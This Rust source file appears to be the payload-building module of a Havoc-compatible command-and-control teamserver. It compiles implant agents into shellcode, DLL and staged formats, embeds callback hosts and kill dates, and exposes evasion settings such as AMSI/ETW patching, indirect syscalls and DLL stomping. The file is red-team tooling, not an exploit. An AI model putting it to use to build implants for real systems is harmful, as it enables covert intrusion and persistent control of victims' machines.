//! Havoc-compatible Demon payload compilation support.

mod build_defs;
mod cache;
mod compiler;
mod config_values;
mod demon;
mod demon_config;
pub(crate) mod ecdh;
mod formats;
mod pe_patch;
mod rust_agent;
mod toolchain;

pub use cache::PayloadCache;
use cache::compute_cache_key;
pub use compiler::parse_compiler_diagnostic;
use demon_config::{demon_config_for_rust_agent_build, merged_request_config, pack_config};
use formats::{Architecture, OutputFormat};
pub use toolchain::ToolchainVersion;
use toolchain::{
    GCC_MIN_VERSION, NASM_MIN_VERSION, Toolchain, parse_gcc_version, parse_nasm_version,
    resolve_executable, run_version_command, verify_tool_version_with,
};

use std::path::{Path, PathBuf};
use std::sync::Arc;

use red_cell_common::ListenerConfig;
use red_cell_common::config::{BinaryConfig, DemonConfig, JobExecutionMode, Profile};
use red_cell_common::operator::{BuildPayloadRequestInfo, CompilerDiagnostic};
use red_cell_common::payload_manifest::{PayloadManifest, encode_manifest, hash_init_secret};
use tempfile::TempDir;
use thiserror::Error;

/// Incremental console output emitted while building a Demon payload.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct BuildProgress {
    /// Havoc-style message severity label.
    pub level: String,
    /// Human-readable build output.
    pub message: String,
}

/// Compiled Demon payload bytes and metadata.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadArtifact {
    /// Final payload bytes returned to the operator.
    pub bytes: Vec<u8>,
    /// Suggested output filename.
    pub file_name: String,
    /// Echoed output format string.
    pub format: String,
    /// For Archon DLL/ReflectiveDll builds: the randomized export function name
    /// (e.g. `Arc3f8b1a…`).  `None` for all other formats and agent types.
    /// Callers that invoke the DLL explicitly (rundll32, loaders) must use this
    /// name rather than the well-known `Start` identifier.
    pub export_name: Option<String>,
}

/// Errors returned by the Demon payload builder.
#[derive(Debug, Error)]
pub enum PayloadBuildError {
    /// A required compiler, source tree, or template file is unavailable.
    #[error("payload build tooling is unavailable: {message}")]
    ToolchainUnavailable { message: String },
    /// The request payload or selected listener is not supported.
    #[error("invalid payload build request: {message}")]
    InvalidRequest { message: String },
    /// JSON in the operator request could not be parsed.
    #[error("failed to parse payload build configuration: {0}")]
    InvalidConfigJson(#[from] serde_json::Error),
    /// An I/O operation failed while compiling or reading artifacts.
    #[error("payload build I/O failed: {0}")]
    Io(#[from] std::io::Error),
    /// A compiler process exited unsuccessfully.
    #[error("payload build command failed: {command}{}", format_stderr_preview(stderr_tail))]
    CommandFailed {
        command: String,
        /// Structured diagnostics parsed from the compiler's stderr output.
        diagnostics: Vec<CompilerDiagnostic>,
        /// First N lines of the compiler's raw stderr — captured so operators
        /// can see fatal errors (missing headers, linker failures, etc.) that
        /// do not match the `filename:line:col: severity: message` diagnostic
        /// pattern and are therefore absent from `diagnostics`.
        stderr_tail: Vec<String>,
    },
}

/// Maximum number of stderr lines captured in `PayloadBuildError::CommandFailed`.
///
/// Chosen so that the first fatal error is almost always included without
/// flooding websocket clients or audit logs with an entire verbose build log.
pub(crate) const MAX_STDERR_TAIL_LINES: usize = 50;

/// Format a short preview of captured stderr lines for error display.
///
/// Returns an empty string when `stderr_tail` is empty so the base error
/// message renders unchanged. Otherwise appends ` — stderr: <line 1> | <line 2> | ...`
/// capped at the first 5 non-empty lines so a one-line `.to_string()` still
/// fits in a log entry.
fn format_stderr_preview(stderr_tail: &[String]) -> String {
    let preview: Vec<&str> = stderr_tail
        .iter()
        .filter(|line| !line.trim().is_empty())
        .take(5)
        .map(String::as_str)
        .collect();
    if preview.is_empty() { String::new() } else { format!(" — stderr: {}", preview.join(" | ")) }
}

/// Teamserver service responsible for compiling Havoc-compatible Demon payloads.
#[derive(Clone, Debug)]
pub struct PayloadBuilderService {
    pub(crate) inner: Arc<PayloadBuilderInner>,
}

/// Per-request agent identity passed through the private build pipeline.
struct AgentBuildContext<'a> {
    /// Lowercase agent name used in output file names (e.g. `"demon"`, `"archon"`).
    name: &'a str,
    /// Root of the agent C/ASM source tree to compile.
    source_root: &'a Path,
}

#[derive(Clone, Debug)]
pub(crate) struct PayloadBuilderInner {
    toolchain: Toolchain,
    source_root: PathBuf,
    /// Source root for the Archon agent fork — points at `agent/archon/`.
    archon_source_root: PathBuf,
    /// Source root for the Phantom Rust agent — points at `agent/phantom/`.
    phantom_source_root: PathBuf,
    /// Source root for the Specter Rust agent — points at `agent/specter/`.
    specter_source_root: PathBuf,
    shellcode_x64_template: PathBuf,
    shellcode_x86_template: PathBuf,
    /// Pre-compiled DllLdr position-independent loader (x64 only).
    /// Prepended to the Demon DLL to produce the Raw Shellcode format.
    dllldr_x64_template: PathBuf,
    /// C source template compiled standalone for the Staged Shellcode format.
    stager_template: PathBuf,
    default_demon: DemonConfig,
    binary_patch: Option<BinaryConfig>,
    pub(crate) cache: PayloadCache,
}

impl PayloadBuilderService {
    /// Resolve the MinGW/NASM toolchain and Havoc payload source tree from `profile`.
    pub fn from_profile(profile: &Profile) -> Result<Self, PayloadBuildError> {
        let repo_root = workspace_root()?;
        Self::from_profile_with_repo_root(profile, &repo_root)
    }

    fn from_profile_with_repo_root(
        profile: &Profile,
        repo_root: &Path,
    ) -> Result<Self, PayloadBuildError> {
        Self::from_profile_with_repo_root_impl(profile, repo_root, run_version_command)
    }

    /// Inner constructor that accepts a custom version-output function so that
    /// tests can avoid subprocess spawns entirely.
    fn from_profile_with_repo_root_impl(
        profile: &Profile,
        repo_root: &Path,
        version_output_fn: fn(&Path) -> Result<String, PayloadBuildError>,
    ) -> Result<Self, PayloadBuildError> {
        let build = profile.teamserver.build.as_ref();

        let compiler_x64 = resolve_executable(
            build.and_then(|config| config.compiler64.as_deref()),
            "x86_64-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x64_version = verify_tool_version_with(
            &compiler_x64,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let compiler_x86 = resolve_executable(
            build.and_then(|config| config.compiler86.as_deref()),
            "i686-w64-mingw32-gcc",
            Some(repo_root),
        )?;
        let compiler_x86_version = verify_tool_version_with(
            &compiler_x86,
            parse_gcc_version,
            &GCC_MIN_VERSION,
            version_output_fn,
        )?;

        let nasm = resolve_executable(
            build.and_then(|config| config.nasm.as_deref()),
            "nasm",
            Some(repo_root),
        )?;
        let nasm_version = verify_tool_version_with(
            &nasm,
            parse_nasm_version,
            &NASM_MIN_VERSION,
            version_output_fn,
        )?;

        tracing::info!(
            compiler_x64 = %compiler_x64.display(),
            compiler_x64_version = %compiler_x64_version,
            compiler_x86 = %compiler_x86.display(),
            compiler_x86_version = %compiler_x86_version,
            nasm = %nasm.display(),
            nasm_version = %nasm_version,
            "payload build toolchain discovered and verified"
        );

        let toolchain = Toolchain {
            compiler_x64,
            compiler_x64_version,
            compiler_x86,
            compiler_x86_version,
            nasm,
            nasm_version,
        };

        let source_root = repo_root.join("agent/demon");
        let archon_source_root = repo_root.join("agent/archon");
        let shellcode_x64_template = repo_root.join("agent/demon/payloads/Shellcode.x64.bin");
        let shellcode_x86_template = repo_root.join("agent/demon/payloads/Shellcode.x86.bin");
        let dllldr_x64_template = repo_root.join("agent/demon/payloads/DllLdr.x64.bin");
        let stager_template = repo_root.join("payloads/templates/MainStager.c");

        for required_path in [
            &source_root,
            &shellcode_x64_template,
            &shellcode_x86_template,
            &dllldr_x64_template,
            &stager_template,
        ] {
            if !required_path.exists() {
                return Err(PayloadBuildError::ToolchainUnavailable {
                    message: format!("required payload asset missing: {}", required_path.display()),
                });
            }
        }

        // Archon/Phantom/Specter source roots are optional at startup — they
        // may not be present on all developer machines.  A missing source tree
        // is only an error when an operator actually requests that agent type.
        let phantom_source_root = repo_root.join("agent/phantom");
        let specter_source_root = repo_root.join("agent/specter");

        let cache = PayloadCache::new(repo_root.join("target/payload-cache"));

        Ok(Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root,
                specter_source_root,
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon: profile.demon.clone(),
                binary_patch: profile.demon.binary.clone(),
                cache,
            }),
        })
    }

    /// Compile a Demon payload for `listener` using the operator `request`.
    ///
    /// If a cached artifact exists for the same inputs, the compilation is
    /// skipped and the cached bytes are returned immediately.
    /// Build a payload artifact for the given listener and request.
    ///
    /// `ecdh_pub_key` — X25519 public key to embed in Archon builds targeting
    /// non-legacy listeners.  When `Some`, the compiler receives
    /// `-DARCHON_ECDH_MODE` and `-DARCHON_LISTENER_PUBKEY={…}` so the agent
    /// performs ECDH instead of sending the AES session key in plaintext.
    /// Ignored for Demon, Phantom, and Specter builds.
    pub async fn build_payload<F>(
        &self,
        listener: &ListenerConfig,
        request: &BuildPayloadRequestInfo,
        ecdh_pub_key: Option<[u8; 32]>,
        mut progress: F,
    ) -> Result<PayloadArtifact, PayloadBuildError>
    where
        F: FnMut(BuildProgress),
    {
        // Resolve the agent name and source root for this build request.
        let agent_type = request.agent_type.trim();

        // Phantom and Specter are Rust agents with a fundamentally different
        // build pipeline (cargo build instead of C/ASM cross-compilation).
        // Route them to the dedicated Rust-agent builder and return early.
        match agent_type {
            "Phantom" => {
                let merged =
                    merged_request_config(&request.config, "phantom", &self.inner.default_demon)?;
                let demon = demon_config_for_rust_agent_build(&merged, &self.inner.default_demon)?;
                return self
                    .build_rust_agent(
                        listener,
                        "phantom",
                        &self.inner.phantom_source_root,
                        "x86_64-unknown-linux-gnu",
                        "",
                        ecdh_pub_key,
                        &demon,
                        &mut progress,
                    )
                    .await;
            }
            "Specter" => {
                let merged =
                    merged_request_config(&request.config, "specter", &self.inner.default_demon)?;
                let demon = demon_config_for_rust_agent_build(&merged, &self.inner.default_demon)?;
                return self
                    .build_rust_agent(
                        listener,
                        "specter",
                        &self.inner.specter_source_root,
                        "x86_64-pc-windows-gnu",
                        ".exe",
                        ecdh_pub_key,
                        &demon,
                        &mut progress,
                    )
                    .await;
            }
            _ => {}
        }

        let (agent_name, source_root) = match agent_type {
            "Demon" => ("demon", &self.inner.source_root),
            "Archon" => {
                if !self.inner.archon_source_root.exists() {
                    return Err(PayloadBuildError::ToolchainUnavailable {
                        message: format!(
                            "Archon source tree not found at {}",
                            self.inner.archon_source_root.display()
                        ),
                    });
                }
                ("archon", &self.inner.archon_source_root)
            }
            other => {
                return Err(PayloadBuildError::InvalidRequest {
                    message: format!("unsupported agent type `{other}`"),
                });
            }
        };

        let architecture = Architecture::parse(&request.arch)?;
        let format = OutputFormat::parse(&request.format)?;

        // The staged shellcode stager does not embed a Demon config — it only
        // needs the C2 connection parameters from the listener.  Route it to a
        // separate fast path that bypasses pack_config entirely.
        if format == OutputFormat::StagedShellcode {
            return self
                .build_staged_payload(listener, architecture, &request.format, &mut progress)
                .await;
        }

        let config = merged_request_config(&request.config, agent_name, &self.inner.default_demon)?;

        // Compute the packed config bytes that will be embedded in the compiled
        // binary. Using these as part of the cache key ensures that any change
        // to the listener or demon configuration produces a distinct cache entry.
        let config_bytes = pack_config(listener, &config, agent_name)?;

        // Archon builds must never be served from cache: each build embeds a unique
        // per-build magic constant (-DARCHON_MAGIC_VALUE=0x…), so returning a cached
        // binary would reuse an old magic and violate the "no two builds share the
        // same magic" requirement.
        let is_archon = agent_name == "archon";

        let cache_key = if is_archon {
            None
        } else {
            Some(compute_cache_key(
                agent_name,
                architecture,
                format,
                &config_bytes,
                self.inner.binary_patch.as_ref(),
            )?)
        };

        if let Some(ref key) = cache_key {
            if let Some(cached) = self.inner.cache.get(key).await {
                progress(BuildProgress {
                    level: "Info".to_owned(),
                    message: "cache hit — returning cached artifact".to_owned(),
                });
                let file_name =
                    format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());
                return Ok(PayloadArtifact {
                    bytes: cached,
                    file_name,
                    format: request.format.clone(),
                    // Archon builds bypass the cache (is_archon guard above), so cached
                    // artifacts are always non-Archon; export_name is never needed here.
                    export_name: None,
                });
            }
        }

        progress(BuildProgress { level: "Info".to_owned(), message: "starting build".to_owned() });

        let temp_dir = TempDir::new()?;
        let agent_ctx = AgentBuildContext { name: agent_name, source_root };
        let (mut compiled, export_name) = self
            .build_impl(
                listener,
                architecture,
                format,
                &config,
                &agent_ctx,
                temp_dir.path(),
                ecdh_pub_key,
                &mut progress,
            )
            .await?;
        let file_name = format!("{agent_name}{}{}", architecture.suffix(), format.file_extension());

        let manifest = build_manifest(
            listener,
            agent_type,
            &request.arch,
            &request.format,
            &self.inner.default_demon,
            export_name.as_deref(),
        );
        append_manifest(&mut compiled, &manifest)?;

        if let Some(ref key) = cache_key {
            self.inner.cache.put(key, &compiled).await;
        }

        Ok(PayloadArtifact {
            bytes: compiled,
            file_name,
            format: request.format.clone(),
            export_name,
        })
    }

    /// Return a reference to the payload artifact cache.
    pub fn cache(&self) -> &PayloadCache {
        &self.inner.cache
    }

    #[doc(hidden)]
    pub fn disabled_for_tests() -> Self {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("..");
        let unknown_version =
            ToolchainVersion { major: 0, minor: 0, patch: 0, raw: "0.0.0".to_owned() };
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain: Toolchain {
                    compiler_x64: PathBuf::from("/nonexistent/x64-gcc"),
                    compiler_x64_version: unknown_version.clone(),
                    compiler_x86: PathBuf::from("/nonexistent/x86-gcc"),
                    compiler_x86_version: unknown_version.clone(),
                    nasm: PathBuf::from("/nonexistent/nasm"),
                    nasm_version: unknown_version,
                },
                source_root: root.join("agent/demon"),
                archon_source_root: PathBuf::from("/nonexistent/agent/archon"),
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template: root.join("agent/demon/payloads/Shellcode.x64.bin"),
                shellcode_x86_template: root.join("agent/demon/payloads/Shellcode.x86.bin"),
                dllldr_x64_template: root.join("agent/demon/payloads/DllLdr.x64.bin"),
                stager_template: root.join("payloads/templates/MainStager.c"),
                default_demon: DemonConfig {
                    sleep: None,
                    jitter: None,
                    indirect_syscall: false,
                    stack_duplication: false,
                    sleep_technique: None,
                    proxy_loading: None,
                    amsi_etw_patching: None,
                    injection: None,
                    dotnet_name_pipe: None,
                    binary: None,
                    init_secret: None,
                    init_secrets: Vec::new(),
                    trust_x_forwarded_for: false,
                    trusted_proxy_peers: Vec::new(),
                    heap_enc: true,
                    allow_legacy_ctr: false,
                    job_execution: JobExecutionMode::Thread,
                    stomp_dll: None,
                },
                binary_patch: None,
                cache: PayloadCache::new(PathBuf::from("/nonexistent/payload-cache")),
            }),
        }
    }

    #[cfg(test)]
    #[allow(clippy::too_many_arguments)]
    fn with_paths_for_tests(
        toolchain: Toolchain,
        source_root: PathBuf,
        archon_source_root: PathBuf,
        shellcode_x64_template: PathBuf,
        shellcode_x86_template: PathBuf,
        dllldr_x64_template: PathBuf,
        stager_template: PathBuf,
        default_demon: DemonConfig,
        binary_patch: Option<BinaryConfig>,
        cache_dir: PathBuf,
    ) -> Self {
        Self {
            inner: Arc::new(PayloadBuilderInner {
                toolchain,
                source_root,
                archon_source_root,
                phantom_source_root: PathBuf::from("/nonexistent/agent/phantom"),
                specter_source_root: PathBuf::from("/nonexistent/agent/specter"),
                shellcode_x64_template,
                shellcode_x86_template,
                dllldr_x64_template,
                stager_template,
                default_demon,
                binary_patch,
                cache: PayloadCache::new(cache_dir),
            }),
        }
    }
}

/// Build a [`PayloadManifest`] from the listener config and build parameters.
///
/// The manifest is appended to every compiled payload so that
/// `red-cell-cli payload inspect` can extract build metadata offline.
fn build_manifest(
    listener: &ListenerConfig,
    agent_type: &str,
    arch: &str,
    format: &str,
    demon: &DemonConfig,
    export_name: Option<&str>,
) -> PayloadManifest {
    let (hosts, port, secure, kill_date_str, working_hours_str) = match listener {
        ListenerConfig::Http(http) => (
            http.hosts.clone(),
            Some(http.port_conn.unwrap_or(http.port_bind)),
            http.secure,
            http.kill_date.clone(),
            http.working_hours.clone(),
        ),
        ListenerConfig::Smb(smb) => {
            (vec![smb.name.clone()], None, false, smb.kill_date.clone(), smb.working_hours.clone())
        }
        ListenerConfig::Dns(dns) => {
            (vec![dns.name.clone()], None, false, dns.kill_date.clone(), dns.working_hours.clone())
        }
        ListenerConfig::External(ext) => (vec![ext.name.clone()], None, false, None, None),
    };

    let callback_url = match listener {
        ListenerConfig::Http(http) => {
            let scheme = if http.secure { "https" } else { "http" };
            let p = http.port_conn.unwrap_or(http.port_bind);
            let host = http.hosts.first().map(|h| h.as_str()).unwrap_or("127.0.0.1");
            let host_name = host
                .rsplit_once(':')
                .and_then(|(name, p)| p.parse::<u16>().ok().map(|_| name))
                .unwrap_or(host);
            Some(format!("{scheme}://{host_name}:{p}/"))
        }
        _ => None,
    };

    let init_secret_hash = if !demon.init_secrets.is_empty() {
        demon
            .init_secrets
            .iter()
            .max_by_key(|v| v.version)
            .map(|entry| hash_init_secret(&entry.secret))
    } else {
        demon.init_secret.as_deref().map(|s| hash_init_secret(s))
    };

    let sleep_ms = demon.sleep.map(|s| s.saturating_mul(1000));
    let jitter = demon.jitter.map(u32::from);

    let kill_date_epoch = config_values::parse_kill_date(kill_date_str.as_deref()).unwrap_or(0);
    let kill_date = if kill_date_epoch > 0 { kill_date_str } else { None };

    let working_hours_packed =
        config_values::parse_working_hours(working_hours_str.as_deref()).unwrap_or(0);
    let working_hours_mask =
        if working_hours_packed != 0 { Some(working_hours_packed as u32) } else { None };

    let built_at = time::OffsetDateTime::now_utc()
        .format(&time::format_description::well_known::Rfc3339)
        .unwrap_or_else(|_| "unknown".to_owned());

    PayloadManifest {
        agent_type: agent_type.to_owned(),
        arch: arch.to_owned(),
        format: format.to_owned(),
        hosts,
        port,
        secure,
        callback_url,
        sleep_ms,
        jitter,
        init_secret_hash,
        kill_date,
        working_hours_mask,
        listener_name: listener.name().to_owned(),
        export_name: export_name.map(str::to_owned),
        built_at,
    }
}

/// Append a build manifest to payload bytes.
fn append_manifest(
    bytes: &mut Vec<u8>,
    manifest: &PayloadManifest,
) -> Result<(), PayloadBuildError> {
    let trailer = encode_manifest(manifest).map_err(|e| {
        PayloadBuildError::Io(std::io::Error::other(format!("manifest encode: {e}")))
    })?;
    bytes.extend_from_slice(&trailer);
    Ok(())
}

pub(crate) fn workspace_root() -> Result<PathBuf, PayloadBuildError> {
    let manifest_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    let workspace_root =
        manifest_dir.parent().ok_or_else(|| PayloadBuildError::ToolchainUnavailable {
            message: format!(
                "failed to resolve repository root: manifest directory `{}` has no parent",
                manifest_dir.display()
            ),
        })?;
    workspace_root.canonicalize().map_err(|source| PayloadBuildError::ToolchainUnavailable {
        message: format!("failed to resolve repository root: {source}"),
    })
}

#[cfg(test)]
mod tests;
